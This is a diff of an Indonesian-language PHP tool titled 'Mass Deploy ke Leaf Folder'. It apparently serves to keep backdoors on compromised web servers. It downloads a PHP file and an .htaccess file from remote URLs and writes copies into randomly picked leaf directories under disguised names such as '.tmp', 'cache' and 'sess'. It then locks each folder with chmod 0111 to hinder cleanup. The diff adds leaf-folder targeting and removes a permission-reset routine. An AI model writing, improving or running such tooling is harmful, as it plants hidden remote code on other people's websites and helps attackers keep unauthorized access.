@@ -19,27 +19,6 @@ function fetchFileFromUrl($url) {
     return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
 }
 
-function setPermissions($dir, &$success, &$error) {
-    $rii = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
-    );
-    foreach ($rii as $file) {
-        if ($file->isDir()) {
-            if (@chmod($file->getPathname(), 0755)) {
-                $success[] = "📁 chmod 0755: " . $file->getPathname();
-            } else {
-                $error[] = "❌ gagal chmod folder: " . $file->getPathname();
-            }
-        } elseif ($file->isFile()) {
-            if (@chmod($file->getPathname(), 0644)) {
-                $success[] = "📄 chmod 0644: " . $file->getPathname();
-            } else {
-                $error[] = "❌ gagal chmod file: " . $file->getPathname();
-            }
-        }
-    }
-}
-
 function generateRandomFolderName($base, $used = []) {
     $names = ['.tmp', 'cache', 'function', 'logs', 'sess', 'lib', 'assets', 'data'];
     shuffle($names);
@@ -50,6 +29,29 @@ function generateRandomFolderName($base, $used = []) {
         }
     }
     return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
+}
+
+function findLeafFolders($dir) {
+    $leafFolders = [];
+
+    $rii = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+
+    foreach ($rii as $file) {
+        if ($file->isDir()) {
+            $sub = glob($file->getPathname() . '/*', GLOB_ONLYDIR);
+            if (empty($sub)) {
+                $leafFolders[] = $file->getPathname();
+            }
+        }
+    }
+
+    $subRoot = glob($dir . '/*', GLOB_ONLYDIR);
+    if (empty($subRoot)) $leafFolders[] = $dir;
+
+    return $leafFolders;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -69,48 +71,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!$htaccessContent) $error[] = "❌ Gagal ambil .htaccess dari URL.";
 
         if ($phpContent && $htaccessContent) {
-            $success[] = "--- 🛠 Set permission awal ---";
-            setPermissions($target, $success, $error);
+            $leafFolders = findLeafFolders($target);
+            $success[] = "📦 Folder buntu ditemukan: " . count($leafFolders);
 
-            $all = [];
-            $rii = new RecursiveIteratorIterator(
-                new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS)
-            );
-            foreach ($rii as $file) {
-                if ($file->isDir()) {
-                    $all[] = $file->getPathname();
-                }
-            }
-
-            $success[] = "📊 Total folder ditemukan: " . count($all);
-
-            shuffle($all);
-            $targets = array_slice($all, 0, $limit);
-
-            if (empty($targets)) {
-                $error[] = "❌ Tidak ada subfolder ditemukan untuk deploy.";
+            if (empty($leafFolders)) {
+                $error[] = "❌ Tidak ada folder buntu ditemukan untuk deploy.";
             } else {
+                shuffle($leafFolders);
+                $targets = array_slice($leafFolders, 0, $limit);
                 $usedFolders = [];
-                $success[] = "--- 🚀 Mulai Deploy ---";
 
                 foreach ($targets as $base) {
                     $newFolder = generateRandomFolderName($base, $usedFolders);
                     $usedFolders[] = $newFolder;
 
-                    if (is_dir($newFolder)) {
-                        $error[] = "⚠️ Folder sudah ada dan dilewati: $newFolder";
-                        continue;
-                    }
-
                     if (!mkdir($newFolder, 0755, true)) {
                         $error[] = "❌ Gagal buat folder: $newFolder";
                         continue;
-                    } else {
-                        $success[] = "📁 Folder dibuat: $newFolder";
                     }
 
                     $phpPath = $newFolder . '/' . $phpName;
-                    $htPath = $newFolder . '/.htaccess';
+                    $htPath  = $newFolder . '/.htaccess';
 
                     $ok1 = file_put_contents($phpPath, $phpContent);
                     $ok2 = file_put_contents($htPath, $htaccessContent);
@@ -130,7 +111,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     }
 
                     if (chmod($newFolder, 0111)) {
-                        $success[] = "🔒 Folder dikunci (0111): $newFolder";
+                        $success[] = "🔒 Folder dikunci: $newFolder (chmod 0111)";
                     } else {
                         $error[] = "❌ Gagal chmod 0111: $newFolder";
                     }
@@ -143,7 +124,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚀 Mass Deploy via URL</title>
+    <title>🚀 Mass Deploy ke Leaf Folder</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
         input, button { padding: 10px; width: 100%; margin-bottom: 10px; background: #222; border: none; color: #0f0; }
@@ -154,7 +135,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </style>
 </head>
 <body>
-    <h2>🚀 Mass Deploy .php + .htaccess via URL</h2>
+    <h2>🚀 Mass Deploy ke Leaf Folder</h2>
     <form method="POST">
         <label>📁 Target Path:</label>
         <input type="text" name="target_path" required placeholder="/var/www/html">
